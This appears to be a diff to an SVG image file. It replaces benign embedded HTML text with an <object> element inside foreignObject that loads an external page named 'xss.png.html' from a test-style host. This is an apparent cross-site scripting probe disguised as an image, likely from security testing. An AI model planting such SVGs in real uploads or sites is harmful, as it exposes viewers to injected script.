@@ -1,8 +1,7 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
-  <foreignObject x="10" y="10" width="180" height="180">
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <foreignObject x="10" y="10" width="480" height="480">
     <body xmlns="http://www.w3.org/1999/xhtml">
-      <h1 style="color: red;">Hello from HTML inside SVG</h1>
-      <p>This is HTML content embedded inside an SVG.</p>
+      <object data="https://evaluatortest.github.io/test.github.io/xss.png.html" type="text/html" width="100%" height="100%"></object>
     </body>
   </foreignObject>
 </svg>
